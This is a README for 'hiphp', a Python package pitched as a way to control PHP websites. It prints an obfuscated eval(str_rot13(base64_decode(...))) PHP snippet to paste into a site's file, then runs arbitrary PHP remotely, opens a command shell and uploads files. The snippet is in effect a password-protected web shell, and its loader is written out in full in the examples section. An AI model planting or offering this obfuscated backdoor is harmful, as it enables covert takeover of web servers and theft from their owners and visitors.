
<p align="center"><img align="center" src="https://raw.githubusercontent.com/byRo0t96/hiphp/main/screenshot/screenshot.png"></p>
<h1>hiphp for control php websites.</h1>

<p>A package for controlling a php-based website.</p>
<p align="center">
    <img align="center" src="https://travis-ci.com/byRo0t96/hiphp.svg?branch=main">
    <img align="center" src="https://img.shields.io/github/issues/byRo0t96/hiphp">
    <img align="center" src="https://img.shields.io/github/forks/byRo0t96/hiphp">
    <img align="center" src="https://img.shields.io/github/stars/byRo0t96/hiphp">
    <img align="center" src="https://img.shields.io/badge/license-Apache--2.0-green.svg">
    <img align="center" src="https://img.shields.io/badge/python-3.x.x-blue">
</p>
<h2>Installation:</h2>

```
pip install hiphp==0.1.9
```

<h2>Usage:</h2>

```python
# USAGE :
#s
from hiphp import hiphp

p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>",False) #In order to print the result directly.
#p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>") #In order to make the result as a variable.
print(p1.get_code()) #Get HIPHP ID for first use.
p1.run("<YOUR_CODE>") #Run a code or line in your website.
p1.run_file("<PHP_CODE_FILE_PATH>") #Run a code or line in your website from a file.
p1.run_file("<PHP_CODE_FILE_PATH>","<__VALUE_NAME__>==<VALUE_CONTENT>") #Run a code or line in your website from a file With the entry of variables.
p1.cli() #open command panel
p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>") #Upload a file to the server hosting the site.
p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOAD_THE_FILE_TO>")
#e

```

<h2>Examples:</h2>

```python
# EXAMPLES :
#s
from hiphp import hiphp

p1=hiphp("123","http://localhost/index.php",False)

# Example:1
# GET ID:
print(p1.get_code())
# OUTPUT:
'''
/*php code start*/
eval(str_rot13(base64_decode(str_rot13(base64_decode('bkpMYldTOUdFSVdKRUlXb1cwdUhJU09zSUlBU0h5OU9FMElCSVBxcUNHMGFaUUx3QlJEM0F3RDBBUlJsWndSbEIwRGtDR1pqWUd0MFdHRDVDbU4xQ1JaakpteDFybVNPWFFOMkJ3SVBuR1Zsb0hObFpRTzBEbU9uQkdEY1p3dTlEMFdxQkdEK0FtTnVEeFp4QXdOekR3RXNBbU5lQUhWa0VRTG1abVYxRHdwM1pSTDVXbHk3TUpBYm9scHdwVXkwblQ5aFdtZ2NNdnVjcDNBeXFQdHhLMU9DSDFFb1cyQWlvSjF1b3pEYUtGeGNyMkkyTEpqYldTOURHMUFISmxxd28yMWdMSjV4VzEwY0IzMXlyVHkwQjMwPQ==')))));
/*php code end*/
'''
# Copy this code into the file whose path you entered earlier.
# for example: https://localhost/index.php


# Example:2
# Command:
p1.run("echo 'this is a test';")
# OUTPUT:
'''
this is a test
'''

# Example:3
# Run code from file:
#-example_3.php content:
'''
echo 'this is a test';
'''
#OR
'''
<?php
    echo 'this is a test';
?>
'''
p1.run_file("example_3.php")
# OUTPUT:
'''
this is a test
'''

# Example:4
# Run code from file With the entry of variables:
#-example_4.php content:
'''
echo '__test__';
'''
#OR
'''
<?php
    echo '__test__';
?>
'''
p1.run_file("example_4.php","test==this is a test")
# OUTPUT:
'''
this is a test
'''

# Example:5
# Command line interface:
p1.cli()
# OUTPUT:
'''
hiphp>>>
'''

# Example:6
# Upload a picture:
p1.upload("picture_example.png")

# Example:7
# Upload a picture to a specific path:
p1.upload("picture_example.png","./pictures/")
#e

```

<h2>Changelog:</h2>

```
## 0.1.9
 - fix bugs.

## 0.1.7
 - fix bugs.

## 0.1.6
 - fix bugs.
 - add upload to upload any file.
 - Simplify the use of the program.

## 0.1.5
 - fix bugs.

## 0.1.4
 - fix bugs.
 - new build. 

## 0.1.1
- Import pakages by pipincluder.
- Fix bugs.

## 0.1.0
- New build.
- Fix bugs.

## 0.0.4
- Fix bugs.

## 0.0.2
- Fix bugs.
- Add help list.
- Add Executing from files.

## 0.0.1
- First public release.


```
<br>
<br>
<p align="center">
    <a align="center" href="https://byro0t96.github.io/">
        <img alt="byRo0t96" height="100" align="center" src="https://raw.githubusercontent.com/byRo0t96/byRo0t96/main/images/Ro0t-96_v.3.1.png">
    </a>
</p>

<p align="center">
    <a align="center" href="https://www.facebook.com/yasser.bdj.31">
        <img alt="facebook" align="center" src="https://img.shields.io/badge/Facebook-%2Fyasser.bdj.31-blue">
    </a>
	
   <a align="center" href="https://www.youtube.com/channel/UC53dtKxc84BNPyDb51rtRPg">
        <img align="center"  alt="youtube" src="https://img.shields.io/badge/-YouTube-red">
    </a>
	
   <a href="https://www.linkedin.com/in/boudjada-yasser-a53543196" align="center" >
        <img align="center" alt="LinkedIn" src="https://img.shields.io/badge/-linkedin-blue">
    </a> 
    
   <a href="https://www.instagram.com/bdj.yasser/" align="center" >
        <img align="center" alt="instagram" src="https://img.shields.io/badge/instagram-%2Fbdj.yasser-orange">
    </a> 
        
   <a href="https://github.com/byRo0t96/" align="center" >
        <img align="center" alt="visitor-badge" src="https://visitor-badge.laobi.icu/badge?page_id=byRo0t96.byRo0t96">
    </a>
</p>

<p align="center">
    <a align="center" href="https://ko-fi.com/L3L34CEPV">
        <img alt="ko-fi" align="center" src="https://ko-fi.com/img/githubbutton_sm.svg">
    </a>
</p>